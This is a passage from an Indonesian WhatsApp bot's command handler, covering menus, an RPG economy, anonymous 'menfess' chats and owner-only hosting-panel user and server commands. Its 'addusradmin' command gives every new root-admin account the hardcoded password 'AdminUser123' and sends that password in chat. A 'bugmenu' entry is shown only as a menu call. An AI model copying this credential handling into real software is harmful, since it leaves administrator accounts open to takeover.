				let teks = `┌──❖ Halo, Kak ${pushname}! 👋✨\n│ ✧ ${ucapanWaktu} yaa! 😊\n└────────────⳹\n\n🌟 *𝐁𝐎𝐓 𝐈𝐍𝐅𝐎*\n⨳ *Speed*: ${latensie.toFixed(4)} ms\n⨳ *Runtime*: ${runtime(process.uptime())}\n⨳ *Bot*: ${botName}\n⨳ *Owner*: +${ownerNumber}\n⨳ *Mode*: ${sock.public ? 'Public' : 'Self'}\n⨳ *Platform*: ${os.platform()}\n⨳ *Total User*: ${Object.keys(db.data.users).length}\n⨳ *Total Chat*: ${Object.keys(global.db.data.chats).length}\n\n🧍 *𝐔𝐒𝐄𝐑 𝐈𝐍𝐅𝐎*\n⨳ *Nama*: ${pushname}\n⨳ *Number*: +${me.split('@')[0]}\n⨳ *Limit*: ${a.limit}\n⨳ *Status*: ${isVip ? 'VIP User' : isPremium ? 'Premium User' : 'Free User'}\n⨳ *Serial*: ${a.serialNumber}\n\n🕒 *𝐓𝐈𝐌𝐄 𝐈𝐍𝐅𝐎*\n⨳ *Time*: ${time}\n⨳ *Date*: ${date}\n\n${randomAnimeMenu(prefix)}\n\n✨ *Semoga harimu menyenangkan, Kak!* 🥰`;
				sock.sendMessage(m.chat, {
					text: teks,
					contextInfo: {
						forwardingScore: 999999,
						isForwarded: true,
						forwardedNewsletterMessageInfo: {
							newsletterName: saluranName,
							newsletterJid: saluran,
						},
						externalAdReply: {
							showAdAttribution: true,
							title: botName,
							body: ownerName,
							thumbnailUrl: imageUrl,
							sourceUrl: website,
							mediaType: 1,
							renderLargerThumbnail: true
						}
					}
				}, { 
					quoted: m 
				});
			}
			break;

			case 'bugmenu':
			case 'bgmenu':{
				let timestampe = speed();
				let latensie = speed() - timestampe;
				let a = db.data.users[m.sender];
				let me = m.sender;
				await m.react('⏱️');
				let teks = `┌──❖ Halo, Kak ${pushname}! 👋✨\n│ ✧ ${ucapanWaktu} yaa! 😊\n└────────────⳹\n\n🌟 *𝐁𝐎𝐓 𝐈𝐍𝐅𝐎*\n⨳ *Speed*: ${latensie.toFixed(4)} ms\n⨳ *Runtime*: ${runtime(process.uptime())}\n⨳ *Bot*: ${botName}\n⨳ *Owner*: +${ownerNumber}\n⨳ *Mode*: ${sock.public ? 'Public' : 'Self'}\n⨳ *Platform*: ${os.platform()}\n⨳ *Total User*: ${Object.keys(db.data.users).length}\n⨳ *Total Chat*: ${Object.keys(global.db.data.chats).length}\n\n🧍 *𝐔𝐒𝐄𝐑 𝐈𝐍𝐅𝐎*\n⨳ *Nama*: ${pushname}\n⨳ *Number*: +${me.split('@')[0]}\n⨳ *Limit*: ${a.limit}\n⨳ *Status*: ${isVip ? 'VIP User' : isPremium ? 'Premium User' : 'Free User'}\n⨳ *Serial*: ${a.serialNumber}\n\n🕒 *𝐓𝐈𝐌𝐄 𝐈𝐍𝐅𝐎*\n⨳ *Time*: ${time}\n⨳ *Date*: ${date}\n\n${bugMenu(prefix)}\n\n✨ *Semoga harimu menyenangkan, Kak!* 🥰`;
				sock.sendMessage(m.chat, {
					text: teks,
					contextInfo: {
						forwardingScore: 999999,
						isForwarded: true,
						forwardedNewsletterMessageInfo: {
							newsletterName: saluranName,
							newsletterJid: saluran,
						},
						externalAdReply: {
							showAdAttribution: true,
							title: botName,
							body: ownerName,
							thumbnailUrl: imageUrl,
							sourceUrl: website,
							mediaType: 1,
							renderLargerThumbnail: true
						}
					}
				}, { 
					quoted: m 
				});
			}
			break;

			case 'rpgmenu':
			case 'rmenu':{
				let timestampe = speed();
				let latensie = speed() - timestampe;
				let a = db.data.users[m.sender];
				let me = m.sender;
				await m.react('⏱️');
				let teks = `┌──❖ Halo, Kak ${pushname}! 👋✨\n│ ✧ ${ucapanWaktu} yaa! 😊\n└────────────⳹\n\n🌟 *𝐁𝐎𝐓 𝐈𝐍𝐅𝐎*\n⨳ *Speed*: ${latensie.toFixed(4)} ms\n⨳ *Runtime*: ${runtime(process.uptime())}\n⨳ *Bot*: ${botName}\n⨳ *Owner*: +${ownerNumber}\n⨳ *Mode*: ${sock.public ? 'Public' : 'Self'}\n⨳ *Platform*: ${os.platform()}\n⨳ *Total User*: ${Object.keys(db.data.users).length}\n⨳ *Total Chat*: ${Object.keys(global.db.data.chats).length}\n\n🧍 *𝐔𝐒𝐄𝐑 𝐈𝐍𝐅𝐎*\n⨳ *Nama*: ${pushname}\n⨳ *Number*: +${me.split('@')[0]}\n⨳ *Limit*: ${a.limit}\n⨳ *Status*: ${isVip ? 'VIP User' : isPremium ? 'Premium User' : 'Free User'}\n⨳ *Serial*: ${a.serialNumber}\n\n🕒 *𝐓𝐈𝐌𝐄 𝐈𝐍𝐅𝐎*\n⨳ *Time*: ${time}\n⨳ *Date*: ${date}\n\n${rpgMenu(prefix)}\n\n✨ *Semoga harimu menyenangkan, Kak!* 🥰`;
				sock.sendMessage(m.chat, {
					text: teks,
					contextInfo: {
						forwardingScore: 999999,
						isForwarded: true,
						forwardedNewsletterMessageInfo: {
							newsletterName: saluranName,
							newsletterJid: saluran,
						},
						externalAdReply: {
							showAdAttribution: true,
							title: botName,
							body: ownerName,
							thumbnailUrl: imageUrl,
							sourceUrl: website,
							mediaType: 1,
							renderLargerThumbnail: true
						}
					}
				}, { 
					quoted: m 
				});
			}
			break;

			case 'privacymenu':
			case 'prmenu':{
				let timestampe = speed();
				let latensie = speed() - timestampe;
				let a = db.data.users[m.sender];
				let me = m.sender;
				await m.react('⏱️');
				let teks = `┌──❖ Halo, Kak ${pushname}! 👋✨\n│ ✧ ${ucapanWaktu} yaa! 😊\n└────────────⳹\n\n🌟 *𝐁𝐎𝐓 𝐈𝐍𝐅𝐎*\n⨳ *Speed*: ${latensie.toFixed(4)} ms\n⨳ *Runtime*: ${runtime(process.uptime())}\n⨳ *Bot*: ${botName}\n⨳ *Owner*: +${ownerNumber}\n⨳ *Mode*: ${sock.public ? 'Public' : 'Self'}\n⨳ *Platform*: ${os.platform()}\n⨳ *Total User*: ${Object.keys(db.data.users).length}\n⨳ *Total Chat*: ${Object.keys(global.db.data.chats).length}\n\n🧍 *𝐔𝐒𝐄𝐑 𝐈𝐍𝐅𝐎*\n⨳ *Nama*: ${pushname}\n⨳ *Number*: +${me.split('@')[0]}\n⨳ *Limit*: ${a.limit}\n⨳ *Status*: ${isVip ? 'VIP User' : isPremium ? 'Premium User' : 'Free User'}\n⨳ *Serial*: ${a.serialNumber}\n\n🕒 *𝐓𝐈𝐌𝐄 𝐈𝐍𝐅𝐎*\n⨳ *Time*: ${time}\n⨳ *Date*: ${date}\n\n${privacyMenu(prefix)}\n\n✨ *Semoga harimu menyenangkan, Kak!* 🥰`;
				sock.sendMessage(m.chat, {
					text: teks,
					contextInfo: {
						forwardingScore: 999999,
						isForwarded: true,
						forwardedNewsletterMessageInfo: {
							newsletterName: saluranName,
							newsletterJid: saluran,
						},
						externalAdReply: {
							showAdAttribution: true,
							title: botName,
							body: ownerName,
							thumbnailUrl: imageUrl,
							sourceUrl: website,
							mediaType: 1,
							renderLargerThumbnail: true
						}
					}
				}, { 
					quoted: m 
				});
			}
			break;

			case 'newslettermenu':
			case 'newmenu':{
				let timestampe = speed();
				let latensie = speed() - timestampe;
				let a = db.data.users[m.sender];
				let me = m.sender;
				await m.react('⏱️');
				let teks = `┌──❖ Halo, Kak ${pushname}! 👋✨\n│ ✧ ${ucapanWaktu} yaa! 😊\n└────────────⳹\n\n🌟 *𝐁𝐎𝐓 𝐈𝐍𝐅𝐎*\n⨳ *Speed*: ${latensie.toFixed(4)} ms\n⨳ *Runtime*: ${runtime(process.uptime())}\n⨳ *Bot*: ${botName}\n⨳ *Owner*: +${ownerNumber}\n⨳ *Mode*: ${sock.public ? 'Public' : 'Self'}\n⨳ *Platform*: ${os.platform()}\n⨳ *Total User*: ${Object.keys(db.data.users).length}\n⨳ *Total Chat*: ${Object.keys(global.db.data.chats).length}\n\n🧍 *𝐔𝐒𝐄𝐑 𝐈𝐍𝐅𝐎*\n⨳ *Nama*: ${pushname}\n⨳ *Number*: +${me.split('@')[0]}\n⨳ *Limit*: ${a.limit}\n⨳ *Status*: ${isVip ? 'VIP User' : isPremium ? 'Premium User' : 'Free User'}\n⨳ *Serial*: ${a.serialNumber}\n\n🕒 *𝐓𝐈𝐌𝐄 𝐈𝐍𝐅𝐎*\n⨳ *Time*: ${time}\n⨳ *Date*: ${date}\n\n${newsletterMenu(prefix)}\n\n✨ *Semoga harimu menyenangkan, Kak!* 🥰`;
				sock.sendMessage(m.chat, {
					text: teks,
					contextInfo: {
						forwardingScore: 999999,
						isForwarded: true,
						forwardedNewsletterMessageInfo: {
							newsletterName: saluranName,
							newsletterJid: saluran,
						},
						externalAdReply: {
							showAdAttribution: true,
							title: botName,
							body: ownerName,
							thumbnailUrl: imageUrl,
							sourceUrl: website,
							mediaType: 1,
							renderLargerThumbnail: true
						}
					}
				}, { 
					quoted: m 
				});
			}
			break;

			case 'aimenu':
			case 'aimnu':{
				let timestampe = speed();
				let latensie = speed() - timestampe;
				let a = db.data.users[m.sender];
				let me = m.sender;
				await m.react('⏱️');
				let teks = `┌──❖ Halo, Kak ${pushname}! 👋✨\n│ ✧ ${ucapanWaktu} yaa! 😊\n└────────────⳹\n\n🌟 *𝐁𝐎𝐓 𝐈𝐍𝐅𝐎*\n⨳ *Speed*: ${latensie.toFixed(4)} ms\n⨳ *Runtime*: ${runtime(process.uptime())}\n⨳ *Bot*: ${botName}\n⨳ *Owner*: +${ownerNumber}\n⨳ *Mode*: ${sock.public ? 'Public' : 'Self'}\n⨳ *Platform*: ${os.platform()}\n⨳ *Total User*: ${Object.keys(db.data.users).length}\n⨳ *Total Chat*: ${Object.keys(global.db.data.chats).length}\n\n🧍 *𝐔𝐒𝐄𝐑 𝐈𝐍𝐅𝐎*\n⨳ *Nama*: ${pushname}\n⨳ *Number*: +${me.split('@')[0]}\n⨳ *Limit*: ${a.limit}\n⨳ *Status*: ${isVip ? 'VIP User' : isPremium ? 'Premium User' : 'Free User'}\n⨳ *Serial*: ${a.serialNumber}\n\n🕒 *𝐓𝐈𝐌𝐄 𝐈𝐍𝐅𝐎*\n⨳ *Time*: ${time}\n⨳ *Date*: ${date}\n\n${aiMenu(prefix)}\n\n✨ *Semoga harimu menyenangkan, Kak!* 🥰`;
				sock.sendMessage(m.chat, {
					text: teks,
					contextInfo: {
						forwardingScore: 999999,
						isForwarded: true,
						forwardedNewsletterMessageInfo: {
							newsletterName: saluranName,
							newsletterJid: saluran,
						},
						externalAdReply: {
							showAdAttribution: true,
							title: botName,
							body: ownerName,
							thumbnailUrl: imageUrl,
							sourceUrl: website,
							mediaType: 1,
							renderLargerThumbnail: true
						}
					}
				}, { 
					quoted: m 
				});
			}
			break;

			case 'othermenu':
			case 'othmenu':{
				let timestampe = speed();
				let latensie = speed() - timestampe;
				let a = db.data.users[m.sender];
				let me = m.sender;
				await m.react('⏱️');
				let teks = `┌──❖ Halo, Kak ${pushname}! 👋✨\n│ ✧ ${ucapanWaktu} yaa! 😊\n└────────────⳹\n\n🌟 *𝐁𝐎𝐓 𝐈𝐍𝐅𝐎*\n⨳ *Speed*: ${latensie.toFixed(4)} ms\n⨳ *Runtime*: ${runtime(process.uptime())}\n⨳ *Bot*: ${botName}\n⨳ *Owner*: +${ownerNumber}\n⨳ *Mode*: ${sock.public ? 'Public' : 'Self'}\n⨳ *Platform*: ${os.platform()}\n⨳ *Total User*: ${Object.keys(db.data.users).length}\n⨳ *Total Chat*: ${Object.keys(global.db.data.chats).length}\n\n🧍 *𝐔𝐒𝐄𝐑 𝐈𝐍𝐅𝐎*\n⨳ *Nama*: ${pushname}\n⨳ *Number*: +${me.split('@')[0]}\n⨳ *Limit*: ${a.limit}\n⨳ *Status*: ${isVip ? 'VIP User' : isPremium ? 'Premium User' : 'Free User'}\n⨳ *Serial*: ${a.serialNumber}\n\n🕒 *𝐓𝐈𝐌𝐄 𝐈𝐍𝐅𝐎*\n⨳ *Time*: ${time}\n⨳ *Date*: ${date}\n\n${otherMenu(prefix)}\n\n✨ *Semoga harimu menyenangkan, Kak!* 🥰`;
				sock.sendMessage(m.chat, {
					text: teks,
					contextInfo: {
						forwardingScore: 999999,
						isForwarded: true,
						forwardedNewsletterMessageInfo: {
							newsletterName: saluranName,
							newsletterJid: saluran,
						},
						externalAdReply: {
							showAdAttribution: true,
							title: botName,
							body: ownerName,
							thumbnailUrl: imageUrl,
							sourceUrl: website,
							mediaType: 1,
							renderLargerThumbnail: true
						}
					}
				}, { 
					quoted: m 
				});
			}
			break;

			case 'slot': {
				if (!db.data.users[m.sender]) return newReply('⚠️ Data pengguna tidak ditemukan di database!');	
				await gameSlot(sock, m, db.data.users);
			}
			break;
		
			case 'casino': {
				if (!db.data.users[m.sender]) return newReply('⚠️ Data pengguna tidak ditemukan di database!');
				await gameCasinoSolo(sock, m, prefix, db.data.users);
			}
			break;

			case 'daily': {
				if (!db.data.users[m.sender]) return newReply('⚠️ Data pengguna tidak ditemukan di database!');
				await daily(sock, m, db.data.users);
			}
			break;

			case 'transferlimit': {
				if (!db.data.users[m.sender]) return newReply('⚠️ Data pengguna tidak ditemukan di database!');
				await transferLimit(sock, m, args, db.data.users);
			}
			break;

			case 'transfermoney': 
			case 'transferuang': {
				if (!db.data.users[m.sender]) return newReply('⚠️ Data pengguna tidak ditemukan di database!');
				await transferUang(sock, m, args, db.data.users);
			}
			break;

			case 'buy': {
				if (!db.data.users[m.sender]) return newReply('⚠️ Data pengguna tidak ditemukan di database!');
				await buy(m, args, db.data.users);
			}
			break;

			case 'me': 
			case 'account': { 
				if (!db.data.users[m.sender]) return newReply('⚠️ Data pengguna tidak ditemukan di database!');
				let userData = db.data.users[m.sender];
				let replyText = '';
				replyText += `*📋 Informasi User*\n`;
				replyText += `- *Nomor*: ${usernomor}\n`;
				replyText += `- *Nama*: ${userData.nama || 'Belum diatur'}\n`;
				replyText += `- *Umur*: ${userData.umur || 'Belum diatur'}\n`;
				replyText += `- *Asal Kota*: ${userData.askot || 'Belum diatur'}\n`;
				replyText += `- *Level*: ${userData.level || 0}\n`;
				replyText += `- *Exp*: ${userData.exp || 0}\n`;
				replyText += `- *Coins*: ${userData.coins || 0}\n`;
				replyText += `- *Status Premium*: ${userData.premium ? 'Ya' : 'Tidak'}\n`;
				replyText += `- *Status VIP*: ${userData.vip ? 'Ya' : 'Tidak'}\n`;
				replyText += `- *Rank*: ${userData.rank || 'Belum ada'}\n`;
				replyText += `- *Pacar*: ${userData.pacar ? '@' + userData.pacar.replace('@s.whatsapp.net', '') : 'Belum ada'}\n`;
				replyText += `- *Gelar*: ${userData.title || 'Tidak ada'}`;
				let button = [{
					"name": "single_select",
					"buttonParamsJson": `{
						"title": "Buy Limit",
						"sections": [
							{
								"title": "Limit 1 - 1000",
								"rows": [
									{
										"header": "Buy Limit 🟣",
										"title": "1 Limit - Rp. 500",
										"id": "${prefix}buy limit 1"
									},
									{
										"header": "Buy Limit 🟠",
										"title": "50 Limit - Rp. 25.000",
										"id": "${prefix}buy limit 50"
									},
									{
										"header": "Buy Limit 🟢",
										"title": "100 Limit - Rp. 50.000",
										"id": "${prefix}buy limit 100"
									},
									{
										"header": "Buy Limit 🔴",
										"title": "500 Limit - Rp. 250.000",
										"id": "${prefix}buy limit 500"
									},
									{
										"header": "Buy Limit 🟡",
										"title": "1000 Limit - Rp. 500.000",
										"id": "${prefix}buy limit 1000"
									}
								]
							}
						]
					}`
				}]
				
				sock.sendButtonText(m.chat, button, replyText, footer, m)
			}; 
			break; 

			case 'cekuser': 
			case 'infouser': {
				if (!isCreator) return newReply(mess.owner);
				if (!db.data.users[m.sender]) return newReply('⚠️ Data pengguna tidak ditemukan di database!');
				let replyText = '';
				if (!args[0]) {
					replyText += 'Kamu perlu masukin nomor telepon user yang mau dicek ya! 😊\n\n';
					replyText += '*Contoh:*\n';
					replyText += `${prefix + command} 6281234567890`;
					return newReply(replyText);
				}
				let targetNumber = args[0].replace(/[^0-9]/g, '') + '@s.whatsapp.net';
				if (!db.data.users[targetNumber]) {
					replyText += `Nomor *${args[0]}* belum terdaftar di database, kak. 😊`;
					return newReply(replyText);
				}
				let userData = db.data.users[targetNumber];
				replyText += `*📋 Informasi User*\n`;
				replyText += `- *Nomor*: ${args[0]}\n`;
				replyText += `- *Nama*: ${userData.nama || 'Belum diatur'}\n`;
				replyText += `- *Umur*: ${userData.umur || 'Belum diatur'}\n`;
				replyText += `- *Asal Kota*: ${userData.askot || 'Belum diatur'}\n`;
				replyText += `- *Level*: ${userData.level || 0}\n`;
				replyText += `- *Exp*: ${userData.exp || 0}\n`;
				replyText += `- *Coins*: ${userData.coins || 0}\n`;
				replyText += `- *Status Premium*: ${userData.premium ? 'Ya' : 'Tidak'}\n`;
				replyText += `- *Status VIP*: ${userData.vip ? 'Ya' : 'Tidak'}\n`;
				replyText += `- *Rank*: ${userData.rank || 'Belum ada'}\n`;
				replyText += `- *Pacar*: ${userData.pacar || 'Belum ada'}\n`;
				replyText += `- *Gelar*: ${userData.title || 'Tidak ada'}\n`;
				return newReply(replyText);
			}
			break

			case 'limit': 
			case 'checklimit': { 
				if (!db.data.users[m.sender]) return newReply('⚠️ Data pengguna tidak ditemukan di database!');
				let a = db.data.users[m.sender]; 
				let txt = `*📊 INFORMASI LIMIT 📊*\n\n`; 
				txt += `- *Sisa Limit*: ${formatAngka(a.limit)}\n`; 
				txt += `- *Total Limit*: ${formatAngka(a.totalLimit)}\n`; 
				txt += `*Gunakan limit dengan bijak, ya!* 💼`; 
				await sock.sendMessage(m.chat, { 
					text: txt 
				}, { 
					quoted: m 
				}); 
			}; 
			break;

			case 'menfess': 
			case 'menfes': {
				if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
				this.menfes = this.menfes || {};
				let session = Object.values(this.menfes).find(menpes => [menpes.a, menpes.b].includes(m.sender));
				if (session) return newReply(`Uhh... Kamu masih ada di sesi ${command} yang sebelumnya nih, selesaikan dulu ya sebelum mulai yang baru! 🤭`);
				if (m.isGroup) return newReply(`Maaf ya Kak, fitur ini cuma bisa dipakai di chat pribadi aja! 😅`);
				if (!text || !text.includes('|')) {
					return newReply(`Kamu bisa pakai format ini ya: ${prefix + command} nama|nomor|pesan\n\nContoh:\n${prefix + command} ${pushname}|${m.sender.split('@')[0]}|Halo, apa kabar? 👋`);
				}
				let [namaNya, nomorNya, pesanNya] = text.split('|');
				if (!nomorNya || !pesanNya) {
					return newReply(`Uh-oh, formatnya salah! Pastikan pakai format nama|nomor|pesan ya, Kak! 😄`);
				}
				if (nomorNya.startsWith('0') || isNaN(nomorNya)) {
					return newReply(`Nomornya gak valid, Kak! Gunakan format internasional tanpa awalan '0' ya! 🙏`);
				}
				await m.react('⏱️');
				let pesanTemplate = `\nHai Kak, ada menfess nih 😊✨\n\n👤 *Dari*: ${namaNya}\n✉️ *Pesan*: ${pesanNya}\n\n_Pesan ini cuma disampaikan oleh bot ya, Kak! 🤖_`;
				let id = m.sender;
				this.menfes[id] = {
					id,
					a: m.sender,
					b: nomorNya + '@s.whatsapp.net',
					state: 'WAITING'
				};
				const buttons = [
					{
						"name": "single_select",
						"buttonParamsJson": `{
							"title": "Click Here ⎙",
							"sections": [
								{
									"title": "💌 Menerima atau Menolak Menfess",
									"rows": [
										{
											"header": "🤗 Terima Menfess",
											"title": "🌟 Ya, Terima Menfess",
											"description": "Klik ini kalau mau menerima dan memproses menfess ini dengan baik! 🥰",
											"id": "${prefix}balasmenfes"
										},
										{
											"header": "😔 Tolak Menfess",
											"title": "❌ Tidak, Tolak Menfess",
											"description": "Klik ini kalau menfess ini nggak mau diterima. 😢",
											"id": "${prefix}tolakmenfes"
										}
									]
								}
							]
						}`
					}
				];
				sock.sendButtonText(`${nomorNya}@s.whatsapp.net`, buttons, pesanTemplate, footer, fmen);
				newReply(`Yay! Pesan menfess berhasil dikirim ke ${nomorNya}. Sekarang tinggal tunggu responsnya ya, Kak. Kalau gak ada balasan dalam 24 jam, jangan ditunggu lagi ya! 🤭`);
			}
			db.data.users[m.sender].limit -= 1;
			break;

			case 'balasmenfess': 
			case 'balasmenfes': {
				let session = Object.values(this.menfes).find(menpes => [menpes.a, menpes.b].includes(m.sender));
				if (!session) return newReply('Hmmm, sepertinya Kamu belum ada sesi menfess yang aktif deh. 😅');
				let room = Object.values(this.menfes).find(room => [room.a, room.b].includes(m.sender) && room.state === 'WAITING');
				if (!room) return newReply('Gak ada sesi menfess yang menunggu balasan dari Kamu nih. 😢');
				let otherUser = [room.a, room.b].find(user => user !== m.sender);
				room.state = 'CHATTING';
				this.menfes[room.id] = { ...room };
					await sock.sendMessage(otherUser, { 
					text: `_@${m.sender.split('@')[0]} sudah menerima menfess Kamu, sekarang kalian bisa ngobrol lewat bot ini ya!_\n\n*Note*: Kalau mau berhenti, ketik aja .stopmenfess. 😉`, 
					mentions: [m.sender] 
				});
				sock.sendMessage(m.chat, { 
					text: `😊🎉 _Menfess sudah diterima, sekarang Kamu bisa ngobrol lewat bot ini ya!_\n\n*Note*: Kalau mau berhenti, tinggal ketik .stopmenfess. 🤗` 
				});
			}
			break;

			case 'tolakmenfess': 
			case 'tolakmenfes': {
				let session = Object.values(this.menfes).find(menpes => [menpes.a, menpes.b].includes(m.sender));
				if (!session) return newReply('Hmm, gak ada sesi menfess yang Kamu ikuti saat ini. 😕');
				let room = Object.values(this.menfes).find(room => [room.a, room.b].includes(m.sender) && room.state === 'WAITING');
				if (!room) return newReply('Gak ada sesi menfess yang bisa ditolak saat ini, Kak! 😅');
				let otherUser = [room.a, room.b].find(user => user !== m.sender);
				await sock.sendMessage(otherUser, { 
					text: `_Oops... @${m.sender.split('@')[0]} menolak menfess Kamu nih. Gak apa-apa ya, semangat! 🤗_`, 
					mentions: [m.sender] 
				});
				newReply('Menfess berhasil ditolak. Kalau ada yang lain, jangan sungkan buat coba lagi ya, Kak! ✋');
				delete this.menfes[room.id];
			}
			break;

			case 'stopmenfess': 
			case 'stopmenfes': {
				let session = Object.values(this.menfes).find(menpes => [menpes.a, menpes.b].includes(m.sender));
				if (!session) return newReply('Kayaknya Kamu gak ada sesi menfess yang aktif saat ini deh. 😅');
				let otherUser = session.a === m.sender ? session.b : session.a;
				await sock.sendMessage(otherUser, { 
					text: `_Teman chat menghentikan sesi menfess ini ya, Kak. Makasih udah coba fitur ini! 😊_`, 
					mentions: [m.sender] 
				});
				newReply('Sesi menfess sudah dihentikan. Kalau mau mulai lagi, tinggal gunakan perintah yang sama ya, Kak! 😄');
				delete this.menfes[session.id];
			}
			break;

			case 'addusradmin': {
				if (!isCreator) return newReply(mess.owner);
				let inputParams = q.split(',');
				if (inputParams.length < 3) {
					return newReply(`*Format salah!*\n\n*Penggunaan:*\n${prefix + command} email,username,name,number/tag`);
				}
				let emailAddress = inputParams[0];
				let userName = inputParams[1];
				let fullName = inputParams[2];
				let defaultPassword = 'AdminUser123';
				let userToAdd = m.quoted 
				? m.quoted.sender 
				: inputParams[3] 
				? inputParams[3].replace(/[^0-9]/g, '') + '@s.whatsapp.net' 
				: m.mentionedJid[0];
				try {
					if (!userToAdd) {
						return newReply(`*Format salah!*\n\n*Penggunaan:*\n${prefix + command} email,username,name,number/tag`);
					}
					let userExists = (await sock.onWhatsApp(userToAdd.split`@`[0]))[0] || {};
					let generatedPassword = userExists.exists ? randomBytes(5).toString('hex') : inputParams[3];
					let data = await fetch(global.panel + "/api/application/users", {
						"method": "POST",
						"headers": {
							"Accept": "application/json",
							"Content-Type": "application/json",
							"Authorization": "Bearer " + global.apiuser
						},
						"body": JSON.stringify({
							"email": emailAddress,
							"username": userName,
							"first_name": fullName,
							"last_name": "Admin",
							"root_admin": true,
							"language": "en",
							"password": defaultPassword
						})
					});
					let responseData = await data.json();
					if (responseData.errors) {
						return newReply(JSON.stringify(responseData.errors[0], null, 2));
					}
					let newUser = responseData.attributes;
					let teks = `*👑 NEW ADMIN ADDED 👑*\n\n`;
					teks += `🆔 *ID*: ${newUser.id}\n`;
					teks += `👤 *Username*: ${newUser.username}\n`;
					teks += `📧 *Email*: ${newUser.email}\n`;
					teks += `📝 *Name*: ${newUser.first_name} ${newUser.last_name}\n`;
					teks += `🌐 *Language*: ${newUser.language}\n`;
					teks += `🛡️ *Admin*: ${newUser.root_admin ? 'Yes' : 'No'}\n`;
					teks += `📅 *Created At*: ${newUser.created_at}\n`;
					teks += `🔖 *Tags*: @${userToAdd.split("@")[0]}\n`;
					sock.sendMessage(m.chat, {
						image: { url: imageUrl },
						caption: teks
					}, { quoted: m });
					let teks2 = `*🔑 NEW ADMIN LOGIN 🔑*\n\n`;
					teks2 += `📧 *Email*: ${emailAddress}\n`;
					teks2 += `📝 *Username*: ${userName}\n`;
					teks2 += `🔑 *Password*: ${defaultPassword}\n`;
					teks2 += `🌐 *Login*: ${global.panel.replace("https://", "")}\n`;
					await sock.sendMessage(userToAdd, {
						text: teks2
					}, { quoted: m });
				} catch (error) {
					console.log(error);
					newReply(`❌ *Terjadi kesalahan*: ${error.message}`);
				}
			}
			break;

			case 'listusr': {
				if (!isCreator) return newReply(mess.owner);
				let page = args[0] ? args[0] : '1';
				try {
					let data = await fetchJson(global.panel + "/api/application/users?page=" + page, {
						"headers": {
							"Accept": "application/json",
							"Content-Type": "application/json",
							"Authorization": "Bearer " + global.apiuser
						}
					});
					let users = data.data;
					let teks = `*📋 LIST USERS PANEL 📋*\n\n`;
					teks += `\n`;
					for (let user of users) {
						teks += `*User Info*:\n`;
						teks += `🆔 ID : ${user.attributes.id}\n`;
						teks += `👤 Name : ${user.attributes.first_name} ${user.attributes.last_name}\n`;
						teks += `📝 Username : ${user.attributes.username}\n`;
						teks += `📧 Email : ${user.attributes.email}\n`;
						teks += `🛡️ Admin : ${user.attributes.root_admin ? 'Yes' : 'No'}\n`;
						teks += `🔒 2FA : ${user.attributes["2fa"] ? 'Enabled' : 'Disabled'}\n`;
						teks += `\n`;
					}
					teks += `\n📑 *Page*: ${data.meta.pagination.current_page}/${data.meta.pagination.total_pages} pages\n`;
					teks += `📊 *Total Users*: ${data.meta.pagination.total}\n`;
					teks += `📦 *Users per Page*: ${data.meta.pagination.per_page}\n`;
					sock.sendMessage(m.chat, {
						image: { url: imageUrl },
						caption: teks
					}, { quoted: m });
				} catch (error) {
					console.log(error);
					newReply(`❌ *Terjadi kesalahan*: ${error.message}`);
				}
			}
			break;

			case 'listsrv': {
				if (!isCreator) return newReply(mess.owner);
				let page = args[0] ? args[0] : '1';
				try {
					let data = await fetchJson(global.panel + "/api/application/servers?page=" + page, {
						"headers": {
							"Accept": "application/json",
							"Content-Type": "application/json",
							"Authorization": "Bearer " + global.apiuser
						}
					});
					let servers = data.data;
					let teks = `*📋 LIST SERVER PANEL 📋*\n\n`;
					teks += `\n`;
					for (let server of servers) {
						teks += `*🖥️ Server Info*\n`;
						teks += `🆔 *ID*: ${server.attributes.id}\n`;
						teks += `🔑 *Identifier*: ${server.attributes.identifier}\n`;
						teks += `📛 *Name*: ${server.attributes.name}\n`;
						teks += `📝 *Description*: ${server.attributes.description || 'No Description'}\n`;
						teks += `🚫 *Suspended*: ${server.attributes.suspended ? 'Yes' : 'No'}\n\n`;
						teks += `*💾 Storage Info*\n`;
						teks += `🧠 *Memory*: ${server.attributes.limits.memory == 0 ? "Unlimited" : (server.attributes.limits.memory / 1000) + " GB"}\n`;
						teks += `📀 *Disk*: ${server.attributes.limits.disk == 0 ? "Unlimited" : (server.attributes.limits.disk / 1000) + " GB"}\n`;
						teks += `⚙️ *CPU*: ${server.attributes.limits.cpu == 0 ? "Unlimited" : server.attributes.limits.cpu + "%"}\n`;
						teks += `\n`;
					}
					teks += `\n📑 *Page*: ${data.meta.pagination.current_page}/${data.meta.pagination.total_pages}\n`;
					teks += `📊 *Total Servers*: ${data.meta.pagination.total}\n`;
					teks += `📦 *Servers per Page*: ${data.meta.pagination.per_page}\n`;
					sock.sendMessage(m.chat, {
						image: { url: imageUrl },
						caption: teks
					}, { quoted: m });
				} catch (error) {
					console.log(error);
					newReply(`❌ *Terjadi kesalahan*: ${error.message}`);
				}
			}
			break;

			case 'addusr': {
				if (!isCreator) return newReply(mess.owner);
				let input = text.split(",");
				let email = input[0];
				let username = input[1];
				let password = input[2];
				let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : input[3].replace(/[^0-9]/g, '') + '@s.whatsapp.net';
				if (!email || !username || !password || !input[3] && !users) return newReply(`*Masukan ${!email ? "email" : !username ? "username" : !password ? "password" : "penerima"} yang valid!*\n\n*Contoh*:\n${prefix + command} bot@user.com,bot,bot123,@0`);
				let onWA = await sock.onWhatsApp(users);
				if (onWA.length < 1) return newReply("Penerima tidak ada di WhatsApp");
				try {
					const userData = await createUser(email, username, password);
					if (userData.errors) return newReply(JSON.stringify(userData.errors[0], null, 2));
					let teks = `*📋 NEW USERS ADDED 📋*\n\n`;
					teks += `*User Info:*\n`;
					teks += `🆔 *ID*: ${userData.attributes.id}\n`;
					teks += `👤 *Username*: ${userData.attributes.username}\n`;
					teks += `📧 *Email*: ${userData.attributes.email}\n`;
					teks += `👑 *Admin*: ${userData.attributes.root_admin ? 'Yes' : 'No'}\n`;
					teks += `🏷️ *Tags*: @${users.split("@")[0]}\n`;
					sock.sendMessage(m.chat, {
						image: { url: imageUrl },
						caption: teks
					}, { quoted: m });
					let teks2 = `*📋 NEW USERS LOGIN 📋*\n\n`;
					teks2 += `📧 *Email*: ${email}\n`;
					teks2 += `👤 *Username*: ${username}\n`;
					teks2 += `🔑 *Password*: ${password}\n`;
					teks2 += `🔗 *Login*: ${global.panel.replace("https://", "")}\n`;
					await sock.sendMessage(users, {
						text: teks2
					}, { quoted: m });
